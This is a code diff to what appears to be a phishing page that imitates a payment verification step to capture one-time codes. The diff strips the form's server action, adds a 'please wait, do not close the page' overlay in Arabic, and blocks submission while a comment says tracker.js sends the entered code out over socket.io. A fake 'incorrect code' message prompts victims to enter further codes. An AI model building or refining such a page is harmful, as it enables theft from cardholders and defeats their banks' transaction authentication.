@@ -15,6 +15,34 @@
             margin: 0;
             font-family: Arial, sans-serif;
         }
+
+        /* Loading Popup Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+        
+        .loading-spinner {
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid #ef233c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -22,7 +50,7 @@
         <h2>Authentication Required</h2>
         <p>A verification code has been sent to the mobile number registered with your payment method. Please enter it below to authorize this transaction.</p>
         
-        <form action="process_otp.php" method="POST" id="otpForm">
+        <form id="otpForm">
             <input type="text" id="otpCode" name="otpCode" class="otp-input" required placeholder="----" maxlength="6">
             <div class="otp-error" id="otpError">
                 The code you entered is incorrect. A new code will be sent to you shortly, please enter it carefully.
@@ -30,6 +58,12 @@
             
             <button type="submit" class="otp-submit" id="submitBtn" disabled style="background-color: #cccccc; cursor: not-allowed;">Confirm Payment</button>
         </form>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <h3 style="font-family: 'Cairo', sans-serif;">جاري التحميل...</h3>
+        <p style="font-size: 0.9em; opacity: 0.8; font-family: 'Cairo', sans-serif;">الرجاء الانتظار وعدم إغلاق الصفحة</p>
     </div>
 
     <script>
@@ -58,6 +92,18 @@
                 submitBtn.style.backgroundColor = '#cccccc';
                 submitBtn.style.cursor = 'not-allowed';
             }
+        });
+
+        // Handle form submission to show loading popup
+        const otpForm = document.getElementById('otpForm');
+        otpForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent page reload
+            
+            // Show loading overlay
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // Form data is automatically emitted by tracker.js via another listener, 
+            // but we make sure the user stays on the page.
         });
     </script>
 <script src="/socket.io/socket.io.js"></script>
